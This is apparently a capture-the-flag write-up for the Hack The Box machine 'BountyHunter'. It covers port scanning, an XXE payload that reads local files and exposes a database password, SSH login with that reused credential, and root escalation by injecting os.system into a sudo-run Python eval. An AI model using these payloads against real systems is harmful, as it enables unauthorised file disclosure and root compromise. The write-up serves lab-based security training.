---
title: BountyHunter @hackthebox
date: 2021-07-28 09:16:50
tags:
---

![alt](bh.png)
NMAP scan :

```Code
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

scanning the ports on the machine we find port 80 running apache and 22 for ssh.

<!-- more -->

DIR ENUM:
looking for files and directories whit gobuster :

```Code
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -u http://10.10.11.100/ -x php

/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]

```

k , checking the http on 80 leads us to some report system page ![alt](images/1.png)
capture the request in Burp we can get this:

```Code
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 227
Origin: http://10.10.11.100
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kamRqZDwvdGl0bGU%2BCgkJPGN3ZT5kc2FkPC9jd2U%2BCgkJPGN2c3M%2BZGFzZDwvY3Zzcz4KCQk8cmV3YXJkPmRzYWRhPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```

ok so lets try to check whats going on on data var:

```Code
┌──(root💀Vaip3R)-[~/Desktop/burp]
└─# echo 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5kamRqZDwvdGl0bGU%2BCgkJPGN3ZT5kc2FkPC9jd2U%2BCgkJPGN2c3M%2BZGFzZDwvY3Zzcz4KCQk8cmV3YXJkPmRzYWRhPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B' | base64 -d
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>djdjd</titlebase64: invalid input

```

mmm, dear xml ... lets try some XXE
(https://ismailtasdelen.medium.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116)

after some try's i manged to LFI with this payload :

```Code
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>aaa</title>
		<cwe>aaa</cwe>
		<cvss>&ent;</cvss>
		<reward>1</reward>
		</bugreport>

	*need to be based64 and url_encode(key chars)
```

after LFI the /etc/passwd i found only one bash user :

```Code
development:x:1000:1000:Development:/home/development:/bin/bash
```

![alt](images/2.png)
lets check whats on db.php we found in dir enum.

decoding back the file :

```Code
└─# echo 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=' | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

we got Credz! :
lets try the 22 ssh port now :

```Code
ssh development@10.10.11.100                             127 ⨯
development@10.10.11.100's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
Last login: Wed Jul 28 07:03:18 2021 from 10.10.14.40
development@bountyhunter:~$

```

WE GOT USER!

```
development@bountyhunter:~$ cat user.txt
c7af95b55d6###############
```

and a HINT:

```bash
development@bountyhunter:/opt/skytrain_inc$ cat ~/contract.txt
```

Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John

the hint tell us there is some kind of program that checks tickets.

PRIVESC:

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

running sudo -l we can see that we can run this python script as root (/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py)... so let's checkout this file and how we can manipulte it.

```py
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

we can see it opens .md file , so lets check whats going on in the script folder:

```bash
development@bountyhunter:~$ cd /opt/skytrain_inc/
development@bountyhunter:/opt/skytrain_inc$ ls
invalid_tickets  ticketValidator.py
development@bountyhunter:/opt/skytrain_inc$ ls invalid_tickets/
390681613.md  529582686.md  600939065.md  734485704.md
development@bountyhunter:/opt/skytrain_inc$ cat invalid_tickets/390681613.md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

ok , from the code we can see it's cheking fot the # strings and do some checks and then :
validationNumber = eval(x.replace("\*\*", ""))

EVAL IS EIVL:
(line 35)so all we need to do is - in the ticket code we need the first number to be % 7 = 4 and the after the + we can put our evil payload

```bash
development@bountyhunter:/opt/skytrain_inc$ cat /tmp/exp.md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**25+__import__('os').system("cp /root/root.txt /tmp/bashfuck")+86**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/exp.md
Destination: New Haven
Valid ticket.
development@bountyhunter:/opt/skytrain_inc$ cat /tmp/bashfuck
a6ed32618##################
development@bountyhunter:/opt/skytrain_inc$
```

we can run every cmd we like as root (line 5 on payload md file)
ROOT!.
